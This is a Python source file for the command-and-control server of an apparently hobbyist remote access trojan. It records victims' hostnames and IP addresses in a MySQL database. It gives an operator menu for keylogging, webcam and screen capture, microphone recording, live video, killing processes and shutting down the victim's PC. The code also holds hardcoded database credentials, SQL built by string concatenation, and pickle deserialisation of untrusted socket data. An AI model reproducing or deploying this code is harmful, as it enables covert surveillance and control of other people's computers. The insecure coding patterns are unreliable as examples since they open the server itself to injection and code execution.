# import socket programming library
import socket

# Object serialization
import json
import pickle

# import thread module
from _thread import *
import threading

import os # clear console
import sys

import numpy as np
import cv2

import npsocket #https://github.com/ekbanasolutions/numpy-using-socket
from npsocket import SocketNumpyArray

from PIL import Image #https://github.com/python-pillow/Pillow

import mysql.connector

try:
    db = mysql.connector.connect(host = "localhost", user = "itsmrzliced", password = "zlicedvideos90", database = "pythonhack")
    print("Database connected to successfully!")
except mysql.connector.errors.DatabaseError as e:
    print(str(e))
    quit()

cursor = db.cursor()

try:
    cursor.execute("CREATE TABLE clients(ID INT AUTO_INCREMENT PRIMARY KEY, Name TEXT, Local TEXT, Public TEXT)")
    print("Table created successfully!")
except mysql.connector.errors.ProgrammingError as e:
    print(str(e))

global sock_receiver

print_lock = threading.Lock()
global streaming
streaming = False
# thread function
def threaded(c):
    while True:
        global sock_receiver
        global streaming

        # data received from client

        data = c.recv(1024 * 5000)
        c.send(data)

        if "hostname" in data.decode("ascii"):

            msg = data.decode("ascii")
            msg = msg.replace("hostname", "")

            sql = "INSERT INTO clients(Name) VALUES('" + msg + "')"
            cursor.execute(sql)
            db.commit()
            #print(msg + " added to database!")

        if "local" in data.decode("ascii"):

            msg = data.decode("ascii")
            msg = msg.replace("local", "")
            sql = "INSERT INTO clients(Local) VALUES('" + msg + "')"
            cursor.execute(sql)
            db.commit()
            #print(msg + " added to database!")

        if "public" in data.decode("ascii"):

            msg = data.decode("ascii")
            msg = msg.replace("public", "")
            sql = "INSERT INTO clients(Public) VALUES('" + msg + "')"
            cursor.execute(sql)
            db.commit()
            #print(msg + " added to database!")

        try:
            print(data.decode("ascii"))
        except AttributeError as e:
            print(str(e))
        except UnicodeDecodeError as e:
            print(str(e))

        msg = input("-> ")

        if msg == "clear":
            os.system("cls")

        if msg == "help":
            print("1) quit - disconnect client")
            print("2) email - email every attachment created during session")
            print("3) delete - delete every attachment created during session")
            print("4) screenshot - take a screenshot on client's PC")
            print("5) picture - take a picture via webcam on client's PC")
            print("6) record_audio '' - record client's microphone for specified time in seconds")
            print("7) kill '' - kill process on client's PC")
            print("8) dir - print current working directory on client's PC")
            print("9) all_processes - list all running processes on client's PC")
            print("10) logs - print all recorded key logs from client's PC")
            print("11) url '' - open specified url on client's default browser")
            print("12) record_keys - start keylogging client (Blocking)")
            print("13) stop_recording_keys - stop keylogging client")
            print("14) popup '' - open a popup window with specified text")
            print("15) shutdown - shutdown clients PC")
            print("16) mouse - send client's mouse to a new position")
            print("17) play_sound - play audio file")
            print("18) show_webcam_picture '' - show webcam picture taken by index")
            print("19) show_screenshot_picture '' - show screenshot picture taken by index")
            print("20) live_video - live video of client")
            print("21) get_public_ip - get public IP address of client's PC")
        c.send(msg.encode("ascii"))

        
        try:
            data = pickle.loads(data)
            data.show()
        except:
            pass

        try:
            if data.decode("ascii") == "live_video":

                streaming = True

                sock_receiver = SocketNumpyArray()
                sock_receiver.initalize_receiver(6000)
        except AttributeError as e:
            print(str(e))
        except UnicodeDecodeError as e:
            print(str(e))

        if not data:
            print('disconnected')

            # lock released on exit
            print_lock.release()
            break
        
        while streaming:

            frame = sock_receiver.receive_array()

            cv2.imshow("live-feed", frame)

            """if cv2.waitKey(1) & 0xFF == ord("q"): # Close window with 'q'
                cv2.destroyAllWindows()
                break """
            if cv2.waitKey(1) & 0xFF == ord("q"):
                cv2.destroyAllWindows()

                streaming = False
                print("closed")


    # connection closed
    c.close()


def Main():
    #host = socket.gethostname()
    host = "192.168.1.229"
    #print(host)

    # reverse a port on your computer
    # in our case it is 12345 but it
    # can be anything
    port = 5000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    print("socket binded to port", port)

    # put the socket into listening mode
    s.listen(5)
    print("socket is listening")

    # a forever loop until client wants to exit
    while True:

        # establish connection with client
        c, addr = s.accept()

        # lock acquired by client
        print_lock.acquire()
        print('Connected to :', addr[0], ':', addr[1])

        # Start a new thread and return its identifier
        start_new_thread(threaded, (c,))
    s.close()


if __name__ == '__main__':
    Main()
    os.execl(sys.executable, sys.executable, * sys.argv)
